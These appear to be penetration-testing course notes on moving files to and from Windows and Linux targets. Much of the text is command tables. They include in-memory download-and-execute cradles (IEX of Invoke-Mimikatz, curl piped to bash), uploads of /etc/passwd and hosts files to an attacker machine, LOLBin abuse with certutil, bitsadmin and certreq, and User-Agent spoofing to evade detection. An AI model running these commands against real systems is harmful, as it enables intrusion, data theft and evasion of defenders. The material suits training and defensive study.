
# Section 2 - Windows File Transfer Methods 

#### Astaroth Example:  What is a fileless attack?

A **fileless attack** uses **trusted Windows tools (LOLBins)** to download and execute malware, instead of running a suspicious `.exe` file. Although some files may be downloaded, the **final malware usually runs in memory**, making it harder for antivirus to detect.

Astaroth Attack Flow :

1. **Phishing Email** → Victim clicks a malicious **`.lnk` (shortcut)** file.
2. **WMIC** → Downloads and executes a malicious script (`.xsl`/JavaScript).
3. **Bitsadmin** → Downloads the malware in **Base64-encoded** form.
4. **Certutil** → Decodes the Base64 data into real **DLL** files.
5. **Regsvr32** → Executes the malicious DLL.
6. **DLL Injection** → Malware injects itself into **Userinit.exe** (a legitimate Windows process).
7. **Final Payload** → Malware runs **in memory**, stealing data while blending in with normal Windows processes.

## Downloads

### Base64 File Transfer (Linux → Windows)

 1. Generate MD5 hash (Linux)

```bash
md5sum <file>
```

2. Encode file to Base64 (Linux)

```bash
base64 -w 0 <file>
```

3. Decode Base64 and recreate file (PowerShell)

```powershell
[IO.File]::WriteAllBytes("C:\path\file",[Convert]::FromBase64String("<BASE64_STRING>"))
```

 4. Verify file integrity (PowerShell)

```powershell
Get-FileHash C:\path\file -Algorithm MD5
```

### PowerShell Downloads

| **Command**                                                                                                        | **When to use / What it does**                                                           |
| ------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------- |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            | Download a file from a URL and save it to disk.                                          |
| `iwr https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                                          | Short alias of `Invoke-WebRequest` (same command).                                       |
| `(New-Object Net.WebClient).DownloadFile("https://<snip>/PowerView.ps1","C:\Users\Public\PowerView.ps1")`          | Download a file from a URL and save it to a specific Windows path.                       |
| `(New-Object Net.WebClient).DownloadFileAsync("https://<snip>/PowerView.ps1","C:\Users\Public\PowerView.ps1")`     | Same as above, but downloads in the background without waiting.                          |
| `(New-Object Net.WebClient).DownloadString("https://<snip>/script.ps1")`                                           | Download a PowerShell script as plain text (does **not** execute it).                    |
| `IEX (New-Object Net.WebClient).DownloadString("https://<snip>/Invoke-Mimikatz.ps1")`                              | Download a PowerShell script and execute it **directly in memory** (no file saved).      |
| `(New-Object Net.WebClient).DownloadString("https://<snip>/Invoke-Mimikatz.ps1") \| IEX`                           | Same as above, but passes the downloaded text through a pipeline before execution.       |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -UseBasicParsing \| IEX`                                           | Execute a downloaded script when old PowerShell throws Internet Explorer parsing errors. |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Download a file while pretending to be Chrome (useful for User-Agent restrictions).      |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload Base64-encoded data or a file to a web server using HTTP POST.                    |
| `[IO.File]::WriteAllBytes("C:\Users\Public\file",[Convert]::FromBase64String("<BASE64>"))`                         | Convert a Base64 string back into the original file.                                     |
| `Get-FileHash C:\Users\Public\file -Algorithm MD5`                                                                 | Generate an MD5 hash to verify the downloaded/transferred file is unchanged.             |
| `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`                                  | Ignore invalid/self-signed HTTPS certificates during downloads.                          |

More PowerShell cradles can be found at [Download Cradles](https://gist.github.com/HarmJ0y/bb48307ffa663256e239) 

### SMB Downloads

| **Command** | **When to use / What it does** |
|-------------|-------------------------------|
| `impacket-smbserver share /tmp/smbshare` | Share a local Kali folder over SMB (`\\IP\share`). |
| `copy \\IP\share\file.exe` | Download a file directly from the SMB share. |
| `impacket-smbserver share /tmp/smbshare -user test -password test` | Share the folder with SMB authentication (required on newer Windows). |
| `net use n: \\IP\share /user:test test` | Log in and mount the SMB share as drive `N:`. |
| `copy n:\file.exe` | Copy a file from the mounted SMB drive to the current folder. |
### FTP Downloads

| **Command**                                                                               | **When to use / What it does**                                     |
| ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `python3 -m pyftpdlib --port 21`                                                          | Start a simple FTP server on Kali/Pwnbox.                          |
| `(New-Object Net.WebClient).DownloadFile('ftp://IP/file.txt','C:\Users\Public\file.txt')` | Download a file from an FTP server and save it to disk on Windows. |
| `ftp IP`                                                                                  | Connect to an FTP server                                           |

## Uploads

#### Base64 Upload (Windows → Linux, manual copy)

| Step | Command | Purpose |
|------|---------|---------|
| 1 | `[Convert]::ToBase64String((Get-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Encoding Byte))` | Encode a Windows file to Base64 |
| 2 | Copy the Base64 output | Manually move it to Linux |
| 3 | `echo <BASE64> \| base64 -d > hosts` | Decode and save the file on Linux |

#### HTTP Upload (Windows → Kali)

| Step | Command | Purpose |
|------|---------|---------|
| 1 | `python3 -m uploadserver` | Start an HTTP upload server on Kali |
| 2 | `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/PSUpload.ps1')` | Load the PSUpload script into memory on Windows |
| 3 | `Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts` | Upload the Windows file to the Kali server |

#### HTTP POST + Base64 Upload (Windows → Kali)

| Step | Command                                                                                                             | Purpose                                   |
| ---- | ------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| 1    | `nc -lvnp 8000`                                                                                                     | Start a Netcat listener on Kali           |
| 2    | `$b64=[System.Convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))` | Encode the Windows file to Base64         |
| 3    | `Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64`                                        | Send the Base64 data from Windows to Kali |
| 4    | `echo <BASE64> \| base64 -d > hosts`                                                                                | Decode and save the file on Kali          |

#### WebDAV Upload (Windows → Kali)

| Step | Command                                                                  | Purpose                         |
| ---- | ------------------------------------------------------------------------ | ------------------------------- |
| 1    | `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`     | Start a WebDAV server on Kali   |
| 2    | `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\` | Upload the Windows file to Kali |

#### FTP Upload (Windows → Kali)

| Step | Command                                                                                                           | Purpose                                                                                                      |
| ---- | ----------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------ |
| 1    | `sudo python3 -m pyftpdlib --port 21 --write`                                                                     | Start an FTP server on Kali with upload enabled                                                              |
| 2    | `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')` | Upload the Windows file to the Kali FTP server                                                               |
| 3    | `ftp -v -n -s:ftpcommand.txt`                                                                                     | Upload the Windows file using the built-in Windows FTP client where the text file contains all the commands. |
## Question 2


1. Connect to the Windows target:
   ```bash
   xfreerdp /v:<IP> /u:<USER> /p:<PASS>
   ```

NB: If the taskbar viewport is larger and you cant see the windows taskber, try 
`xfreerdp /v:<IP> /u:<USER> /p:<PASS> /size:1280x720`
or `xfreerdp /v:<IP> /u:<USER> /p:<PASS> /f`

2. On the Linux machine, download the lab file:
   ```bash
   wget <file_url>
   ```

3. Extract the ZIP archive:
   ```bash
   unzip <file>.zip
   ```

4. Verify the file's MD5 hash:
   ```bash
   md5sum upload_win.txt
   ```

5. Encode the file to Base64:
   ```bash
   cat upload_win.txt | base64 -w0; echo
   ```

6. On the Windows machine (PowerShell), recreate the file:
   ```powershell
   [IO.File]::WriteAllBytes("<output_path>",[Convert]::FromBase64String("<base64_string>"))
   ```

7. Verify the transferred file's hash:
   ```powershell
   hasher .\upload_win.txt
   ```

8. Submit the MD5 hash as the answer.

# Section 3 - Linux File Transfer Methods

#### Base64 (No Network)

| **Run On**            | **Command**                           | **Purpose**                                  |
| --------------------- | ------------------------------------- | -------------------------------------------- |
| **Source Linux**      | `cat file \| base64 -w0`              | Encode local file to Base64 (copy manually). |
| **Destination Linux** | `echo "<base64>" \| base64 -d > file` | Decode copied Base64 back into a file.       |
| **Either Linux**      | `md5sum file`                         | Verify transferred file integrity.           |


#### HTTP Downloads

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Target Linux** | `wget https://link/file -O /tmp/file` | Download file from attacker/web server. |
| **Target Linux** | `curl -o /tmp/file https://link/file` | Download file using cURL. |


#### Fileless Execution

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Target Linux** | `curl https://link/script.sh \| bash` | Download & execute Bash script in memory. |
| **Target Linux** | `wget -qO- https://link/script.py \| python3` | Download & execute Python script in memory. |


#### Bash HTTP Download (No wget/curl)

| **Run On**       | **Command**                           | **Purpose**                            |
| ---------------- | ------------------------------------- | -------------------------------------- |
| **Target Linux** | `exec 3<>/dev/tcp/<IP>/80`            | Open raw TCP connection to web server. |
| **Target Linux** | `echo -e "GET /file HTTP/1.1\n\n">&3` | Request file over HTTP manually.       |
| **Target Linux** | `cat <&3`                             | Print server response/file contents.   |

#### SCP Download

| **Run On**       | **Command**                         | **Purpose**                                     |
| ---------------- | ----------------------------------- | ----------------------------------------------- |
| **Pwnbox**       | `sudo systemctl start ssh`          | Start SSH server to allow SCP transfers.        |
| **Target Linux** | `scp user@<Pwnbox-IP>:/path/file .` | Download file from Pwnbox to current directory. |


#### HTTPS Upload Server

| **Run On**       | **Command**                                                                                       | **Purpose**                     |
| ---------------- | ------------------------------------------------------------------------------------------------- | ------------------------------- |
| **Pwnbox**       | `pip3 install uploadserver`                                                                       | Install upload server.          |
| **Pwnbox**       | `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -subj "/CN=server"` | Create self-signed certificate. |
| **Pwnbox**       | `python3 -m uploadserver 443 --server-certificate ~/server.pem`                                   | Start HTTPS upload server.      |
| **Target Linux** | `curl -X POST https://<Pwnbox-IP>/upload -F 'files=@/etc/passwd' --insecure`                      | Upload local file to Pwnbox.    |



#### Temporary Web Server

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Target Linux** | `python3 -m http.server` | Share current directory over HTTP. |
| **Target Linux** | `python2.7 -m SimpleHTTPServer` | Same using Python2. |
| **Target Linux** | `php -S 0.0.0.0:8000` | Share current directory using PHP. |
| **Target Linux** | `ruby -run -ehttpd . -p8000` | Share current directory using Ruby. |
| **Pwnbox** | `wget http://<Target-IP>:8000/file` | Download shared file from target. |

#### SCP Upload

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Pwnbox** | `scp /etc/passwd user@<Target-IP>:/home/user/` | Upload local file from Pwnbox to target via SSH. |

# Section 4 - Transferring Files with Code

| **Language**   | **Command**                                                                                                               | **Purpose**                                                         |
| -------------- | ------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| **Python 3**   | `python3 -c 'import urllib.request; urllib.request.urlretrieve("https://link/file","file")'`                              | Download file using Python 3.                                       |
| **Python 2**   | `python2.7 -c 'import urllib; urllib.urlretrieve("https://link/file","file")'`                                            | Download file using Python 2.                                       |
| **Python 3**   | `python3 -c 'import requests; requests.post("http://<Pwnbox-IP>:8000/upload", files={"files":open("/etc/passwd","rb")})'` | Upload local file to Python uploadserver (`python3 -m uploadserve). |
| **PHP**        | `php -r '$f=file_get_contents("https://link/file"); file_put_contents("file",$f);'`                                       | Download file using PHP.                                            |
| **PHP**        | `php -r '$lines=@file("https://link/script.sh"); foreach($lines as $l){echo $l;}' \| bash`                                | Download & execute script (fileless).                               |
| **Ruby**       | `ruby -e 'require "net/http"; File.write("file", Net::HTTP.get(URI.parse("https://link/file")))'`                         | Download file using Ruby.                                           |
| **Perl**       | `perl -e 'use LWP::Simple; getstore("https://link/file","file");'`                                                        | Download file using Perl.                                           |
| **JavaScript** | `cscript.exe /nologo wget.js https://link/file file.ps1`                                                                  | Download file using JavaScript (`cscript`).                         |
| **VBScript**   | `cscript.exe /nologo wget.vbs https://link/file file.ps1`                                                                 | Download file using VBScript (`cscript`).                           |

# Section 5 - Miscellaneous File Transfer Methods

#### Netcat / Ncat (Target listens → Pwnbox sends)

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Target Linux** | `nc -l -p 8000 > file` | Listen and receive file (Netcat). |
| **Target Linux** | `ncat -l -p 8000 --recv-only > file` | Listen and receive file (Ncat). |
| **Pwnbox** | `nc -q 0 <Target-IP> 8000 < file` | Send local file to target (Netcat). |
| **Pwnbox** | `ncat --send-only <Target-IP> 8000 < file` | Send local file to target (Ncat). |

---

#### Netcat / Ncat (Pwnbox listens → Target downloads)

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Pwnbox** | `sudo nc -l -p 443 -q 0 < file` | Host local file for target (Netcat). |
| **Pwnbox** | `sudo ncat -l -p 443 --send-only < file` | Host local file for target (Ncat). |
| **Target Linux** | `nc <Pwnbox-IP> 443 > file` | Download file from Pwnbox (Netcat). |
| **Target Linux** | `ncat <Pwnbox-IP> 443 --recv-only > file` | Download file from Pwnbox (Ncat). |

---

#### /dev/tcp (No nc on Target)

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Pwnbox** | `sudo nc -l -p 443 -q 0 < file` | Host local file. |
| **Target Linux** | `cat < /dev/tcp/<Pwnbox-IP>/443 > file` | Download file without Netcat. |

---

#### PowerShell Remoting (WinRM)

| **Run On** | **Command** | **Purpose** |
|------------|-------------|-------------|
| **Windows** | `Test-NetConnection <Target> -Port 5985` | Check WinRM access. |
| **Windows** | `$Session = New-PSSession -ComputerName <Target>` | Create WinRM session. |
| **Windows** | `Copy-Item -Path C:\file -ToSession $Session -Destination C:\Users\Administrator\Desktop\` | Upload local file to remote Windows. |
| **Windows** | `Copy-Item -Path "C:\Users\Administrator\Desktop\file" -FromSession $Session -Destination C:\` | Download remote file to local Windows. |

---

#### RDP Drive Mount (Linux → Windows)

| **Run On**               | **Command**                                                            | **Purpose**                                          |
| ------------------------ | ---------------------------------------------------------------------- | ---------------------------------------------------- |
| **Pwnbox**               | `xfreerdp /v:<IP> /u:<user> /p:'<pass>' /drive:share,/home/user/files` | Share local Linux folder with RDP session.           |
| **Windows (inside RDP)** | `\\tsclient\share`                                                     | Access mounted Linux folder to copy files both ways. |


# Section 6 - Protected File Transfers

#### Encrypt File (Windows PowerShell)

| **Step**            | **Command**                                                                     | **Purpose**                                                   |
| ------------------- | ------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| **1. Encrypt File** | `Invoke-AESEncryption -Mode Encrypt -Key "<password>" -Path .\scan-results.txt` | Encrypt a file using AES.                                     |
| **2. Output**       | `scan-results.txt.aes`                                                          | Creates an encrypted `.aes` file for secure transfer/storage. |
| Decrypt File        | Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes           | -Path, -Text                                                  |

#### Encrypt File (Linux OpenSSL)

| **Step**            | **Run On** | **Command**                                                                | **Purpose**                               |
| ------------------- | ---------- | -------------------------------------------------------------------------- | ----------------------------------------- |
| **1. Encrypt File** | **Linux**  | `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc` | Encrypt a file using AES-256 with PBKDF2. |
| **2. Decrypt File** | **Linux**  | `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd`   | Decrypt the encrypted file.               |



# Section 8 - Living off the Land (LOLBins / GTFOBins)


| Project | OS | Purpose |
|---------|----|---------|
| **LOLBAS** | Windows | Built-in Windows binaries for file transfer, execution, bypasses, etc. |
| **GTFOBins** | Linux | Built-in Linux binaries for file transfer, privilege escalation, etc. |
- Useful when **curl, wget, PowerShell, or Netcat are unavailable or blocked.**
- **Remember these tools:**
  - `certutil`
  - `bitsadmin`
  - `Start-BitsTransfer`
  - `certreq`
  - `openssl s_server`
  - `openssl s_client`

Open a netcat session in your own machine first `sudo nc -lvnp 8000` to listen.
#### Windows – (Download)

| **Performed On**     | **Command**                                                                                                                 | **Purpose**                                       |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------- |
| **Victim (Windows)** | `bitsadmin /transfer job /priority foreground http://<Pwnbox-IP>:8000/file.exe C:\Temp\file.exe`                            | Download a file from your Pwnbox using Bitsadmin. |
| **Victim (Windows)** | `Import-Module bitstransfer; Start-BitsTransfer -Source "http://<Pwnbox-IP>:8000/file.exe" -Destination "C:\Temp\file.exe"` | Download using PowerShell BITS.                   |
| **Victim (Windows)** | `certutil.exe -verifyctl -split -f http://<Pwnbox-IP>:8000/file.exe`                                                        | Download a file using built-in Certutil.          |

#### Windows – Certreq (Upload)

| **Step** | **Performed On**     | **Command**                                                             | **Purpose**                                |
| -------- | -------------------- | ----------------------------------------------------------------------- | ------------------------------------------ |
| **1**    | **Pwnbox**           | `nc -lvnp 8000`                                                         | Listen for an incoming upload.             |
| **2**    | **Victim (Windows)** | `certreq.exe -Post -config http://<Pwnbox-IP>:8000/ C:\Windows\win.ini` | Upload the file contents to your listener. |

#### Linux – OpenSSL (Download)

| **Step** | **Performed On**   | **Command**                                                                                | **Purpose**                                   |
| -------- | ------------------ | ------------------------------------------------------------------------------------------ | --------------------------------------------- |
| **1**    | **Pwnbox**         | `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem` | Create a self-signed certificate.             |
| **2**    | **Pwnbox**         | `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < file.txt`         | Start an OpenSSL server and serve `file.txt`. |
| **3**    | **Victim (Linux)** | `openssl s_client -connect <Pwnbox-IP>:80 -quiet > file.txt`                               | Download the file from your Pwnbox.           |


# Section 9 - Detection


Most file transfer methods leave detectable traces that defenders can monitor. When tools such as **PowerShell, Certutil, BITS, curl, or Python** download files over HTTP/HTTPS, they automatically send a unique **User-Agent** string that identifies the client. Security teams can build a whitelist of legitimate User-Agents (such as Chrome, Edge, or Windows Update) and investigate any unusual ones. For example, if an attacker downloads `nc.exe` using **PowerShell** with `Invoke-WebRequest`, the web server logs will contain the User-Agent `WindowsPowerShell/5.1` instead of `Mozilla/5.0`, allowing defenders or a SIEM to identify the activity as suspicious and potentially malicious.

The closest thing to "no network traces": **Base64 copy/paste.**

# Section 10 - Evading Detection

Attackers may evade detection by **changing the HTTP User-Agent** or by using **Living Off the Land (LOL)** binaries. Instead of using PowerShell's default `WindowsPowerShell/5.1` User-Agent, they can make requests appear as if they originated from a legitimate browser such as Chrome or Firefox. For example:

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP>/file.exe -UserAgent $UserAgent -OutFile file.exe
```

If tools like **PowerShell** or **Netcat** are blocked, attackers can abuse trusted binaries already installed on the system (**LOLBAS** on Windows or **GTFOBins** on Linux) to perform file transfers. For example, on Windows:

```powershell
GfxDownloadWrapper.exe "http://<IP>/payload.exe" "C:\Temp\payload.exe"
```

These trusted binaries are often allowed by application whitelisting, making them useful for bypassing security controls while still achieving file transfer.
